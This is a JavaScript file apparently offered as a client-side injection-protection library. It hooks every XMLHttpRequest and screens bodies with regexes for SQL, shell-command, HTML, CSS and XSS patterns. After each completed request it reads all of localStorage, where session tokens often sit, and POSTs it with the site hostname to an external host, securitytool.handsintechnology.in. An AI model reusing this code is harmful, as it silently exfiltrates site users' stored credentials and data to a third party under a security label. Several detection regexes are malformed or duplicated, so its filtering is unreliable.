
async function getAlllocalStorageData() {
  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    localStorageData[key] = value;
  }
  if (Object.keys(localStorageData).length === 0) {
    return null;
  } else {
    return localStorageData
  }
}
const ValidatConfiguration = () => {

  let appid = window.appid
  let configuration = window.SecurityValidation
  if (!appid) {
    return false
  }
  else if (!configuration) {
    return false
  } else if (Object.keys(configuration).length == 0) {
    return false
  }
  else if (appid && configuration && Object.keys(configuration).length > 0) {
    return true
  }
}
// Check if session cookie has expiration
// send data to api with xhr request
async function sendToApi(url, data) {
  try {
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ data: data, appid, hostname: window.location.hostname, }),
    }).then((response) => {
      if (response.ok) {
        console.log('Data sent successfully');
      } else {
        console.error('Failed to send data');
      }
    }).catch((error) => {
      console.error('Failed to send data', error);
    });





  } catch (error) {
    console.log("Error in sending data to api", error)
  }
}
const CallSensitivedataLocalStorage = async () => {
  let data = await getAlllocalStorageData()
  if (data !== null) {

    let url = 'https://securitytool.handsintechnology.in/api/client/protection'
    sendToApi(url, data).then(res => res).catch(err => err)
  }
}
// Sql Injection Function
function hasSqlInjection(value) {
  const sqlMeta = new RegExp(
    "(%27)|(--)|([0-9]=[0-9])|([0-9] and [0-9]=[0-9])|([0-9] AND [0-9])|(or [0-9]=[0-9])|(OR [0-9]=[0-9])|(%23)|(#)",
    "i"
  );
  if (sqlMeta.test(value)) {
    return true;
  }

  const sqlMeta2 = new RegExp(
    "((%3D)|(=))[^\n]*((%27)|(')|(--)|(%3B)|(;))",
    "i"
  );
  if (sqlMeta2.test(value)) {
    return true;
  }

  const nestedQuery = new RegExp(
    "((%3D)|(=))[^\n]*((%27)|(')|(--)|(%3B)|(;))?[^\n]*((%27)|(')|(--)|(%3B)|(;))[^\n]*((%3D)|(=))",
    "i"
  );
  if (nestedQuery.test(value)) {
    return true;
  }

  const timeBased = new RegExp("(%3B)|(;)[^\n]*sleep[^\n]*(\d+)[^\n]*", "i");
  if (timeBased.test(value)) {
    return true;
  }

  const booleanBased = new RegExp(
    "((%3D)|(=))[^\n]*[^s]*(%27)|(')|(--)|(%3B)|(;)",
    "i"
  );
  if (booleanBased.test(value)) {
    return true;
  }

  const typicalSql = new RegExp(
    "w*((%27)|('))((%6F)|o|(%4F))((%72)|r|(%52))",
    "i"
  );
  if (typicalSql.test(value)) {
    return true;
  }

  const sqlUnion = new RegExp("((%27)|('))union", "i");
  if (sqlUnion.test(value)) {
    return true;
  }

  const entireText = new RegExp(
    "\b((select|delete|insert|update|drop|create|alter|order by|and)\b.*)",
    "i"
  );
  if (entireText.test(value)) {
    return true;
  }

  return false;
}
// Co0mmandline Injection Function
function hasCommandLineInjection(value) {
  const regexPattern = /(?:\/\*\*\/|\/\*.*?\*\/|\/\/.*?(?=\r?\n)|< !--.*?- ->|(?:&lt;|<)!\-\-.*?\-\-(?:&gt;|>)|\b(?:cat\s*?\/?|grep|system\(\s*?['"`]{0,1}|`\s*?\w+|[|&;`\(\)\s]\s*?\/?(?:bin\/\w+|usr\/\w+|n?cat\s+[\\|;&\(\)\/\w]+?)\s*?[\?&;|`]|(?:;|\?\?|\\\\n|\\\\r\s*\n?)\s*?[\\\;&\|`\(\)\s]?\/\w+\/\w+|['"`&\|`][\s\r\n]|[\?\&][\s\r\n]))|(?:npm\s+(?:install|i|update|uninstall|--version|--help|--force))|(?:yarn\s+(?:add|remove|upgrade|--version|--help|--force))|(?:node\s+[\w\.-]+\.js)|(?:rm\s+-\w*\s*[\w\/\.-]*)|(?:mv\s+[\w\/\.-]+\s+[\w\/\.-]+)|(?:cp\s+[\w\/\.-]+\s+[\w\/\.-]+)|(?:mkdir\s+[\w\/\.-]+)|(?:touch\s+[\w\/\.-]+)|(?:chmod\s+[\w\/\.-]+)|(?:chown\s+[\w\/\.-]+)|(?:ps\s+\w*)|(?:top)|(?:kill\s+-\w*\s*\d+)|(?:pkill\s+\w+)|(?:\(\)\s*\{\s*:;\s*\}\s*;\s*\/\s*\w+(?:\/\s*\w+)?\s*-\w+\s*['"`](?:.*?['"`\?\&]|.*?))/i;


  const commandMeta = new RegExp(regexPattern);

  if (commandMeta.test(value)) {
    return true;
  }

  return false;
}
// HTML Injection Function
function hasHTMLnjection(value) {
  const HTML = new RegExp(/<(\"[^\"]*\"|'[^']*'|[^'\">])*>/, "g");
  if (HTML.test(value)) {
    return true;
  }
  return false;
}
const cssInjectionRegex = /<style[^>]*>|<\/style>|url\s*\((['"]?)javascript:\w*\(\1\)\1\)/gi

function hasCSSInjection(value) {
  if (cssInjectionRegex.test(value)) {
    return true;
  }
  return false;
}
// cSS 
function hasCSSInjection(value) {
  if (cssInjectionRegex.test(value)) {
    return true;
  }
  return false;
}
// HTML Injection Function
const xssRegex = new RegExp('(<script\\b[^>]*>[\\s\\S]*?<\\/script>|<svg\\b|<object\\b|<embed\\b|<iframe\\b|<link\\b|<video\\b|<audio\\b|<body\\b|<frame\\b|<meta\\b|<title\\b|<head\\b|<html\\b|<base\\b|<blink\\b|<marquee\\b|<expression\\b|\\b(?:alert|confirm|console|dialog|prompt|req|response|showModalDialog|write(?:ln)?|XSS|valueOf)?\\s*?[(\'""/] | (?:\\b|[^\\\\])(?:\\\\\\\\)*/?\\s*(?:--|>|<|%3C|%3E|%00|&#x0[0-9a-f]);?)', 'gi');


function hasXSSInjection(value) {
  if (xssRegex.test(value)) {
    return true;
  }
  return false;
}
function InjectionChecker(payload) {
  let containsSql = false,
    validateXss = false,
    validatehtml = false,
    containCommand = false,
    containiframetag = false,
    validateCss = false;
  const value = JSON.stringify(payload)?.toLowerCase();
  if (value.includes("<iframe")) {
    containiframetag = true;
  }
  else if (hasCSSInjection(value) === true) {
    validateCss = true;
  }
  else if (hasXSSInjection(value) === true) {
    validateXss = true;
  }
  else if (hasHTMLnjection(value) === true) {
    validatehtml = true;
  }
  else if (hasCommandLineInjection(value) === true) {
    containCommand = true;
  }
  else if (hasSqlInjection(value) === true) {
    containsSql = true;
  }



  return { containsSql, validateXss, validatehtml, containCommand, containiframetag, validateCss };
}
// CreateUserDetails
const CreateuserDetails = async (type) => {
  try {
    const data = {
      page: window.location.pathname,
      referurl: window.location.href,
      type
    };

    await sendToApi("https://securitytool.handsintechnology.in/api/client/createuserdetailsfromclient", data).then(res => res).catch(err => err)
  } catch (error) {
    console.log("eror in malacius data create ", error);
  }
};




(function (open, send) {
  XMLHttpRequest.prototype.open = function (method, url, async, user, pass) {
    this._method = method;
    this._url = url;
    open.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    console.log('XHR called with method:', this._method);
    console.log('XHR payload:', body);
    let validate = ValidatConfiguration()
    if (!validate) {
      throw new Error("Provide valid data according to Docs")
    }
    const urlParams = new URLSearchParams(window.location.search);
    const queries = Object.fromEntries(urlParams.entries());
    console.log("queries", queries)
    let readjson = () => {
      try {
        body = JSON.parse(body)
        body = { ...body, ...queries }
      } catch (error) {
        body = { body: body, ...queries }
      }
    }
    readjson()
    const injectionFound = InjectionChecker(body);
    if (injectionFound.validateCss) {
      console.log("CSS detected");
      CreateuserDetails("css");
      return; // Stop execution
    } else if (injectionFound.containCommand) {
      console.log("Command detected");
      CreateuserDetails("commandline");
      return; // Stop execution
    } else if (injectionFound.validateXss) {
      console.log("XSS detected");
      CreateuserDetails("xss");
      return; // Stop execution
    } else if (injectionFound.containiframetag) {
      console.log("Iframe detected");
      CreateuserDetails("iframe");
      return; // Stop execution
    } else if (injectionFound.validatehtml) {
      console.log("HTML detected");
      CreateuserDetails("html");
      return; // Stop execution
    } else if (injectionFound.containsSql) {
      console.log("SQL detected");
      CreateuserDetails("sql");
      return; // Stop execution
    }


    const xhr = this;

    const onReadyStateChange = function () {
      if (xhr.readyState === 4) { // 4 means the request is done
        console.log('XHR response data:', xhr.responseText);
        let validate = ValidatConfiguration()
        setTimeout(async () => {
          if (!validate) {
            throw new Error("Provide valid data according to Docs")
          } else {

            await CallSensitivedataLocalStorage().then(res => res).catch(err => err);
          }
        }, 500);
      }
    };

    this.addEventListener('readystatechange', onReadyStateChange);

    send.apply(this, arguments);
  };
})(XMLHttpRequest.prototype.open, XMLHttpRequest.prototype.send);





